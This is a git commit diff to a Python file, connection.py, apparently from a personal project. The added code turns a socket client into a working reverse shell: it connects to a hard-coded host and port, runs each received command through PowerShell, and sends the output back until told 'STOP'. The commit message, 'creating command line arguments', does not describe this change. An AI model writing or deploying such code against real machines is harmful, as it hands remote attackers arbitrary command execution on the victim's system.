df9ababa3fca92a483cffb9086dcbebf36e4abf2
17abd12 <abdullahimran1712@example.com>
2023-06-24 15:48:21 +0500

    creating command line arguments

--- connection.py
+++ connection.py
@@ -1,5 +1,6 @@
 import socket
 import os
+import subprocess
 identifier = "<END OF FILE>"
 arp_addresss = ("192.168.18.149",9000)
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -11,6 +12,13 @@ while True:
     if command == "STOP":
         s.close()
         break
-    message = "okay so let's get started again"
-    message = message + identifier
-    s.send(message.encode())
+    else:
+       raw_message =  subprocess.run(["powershell.exe",command],shell = True,capture_output=True)
+       if raw_message.stderr == "".encode():
+          message = raw_message.stdout.decode()
+       else:
+           message = "error"
+
+
+       message = message + identifier
+    s.sendall(message.encode())
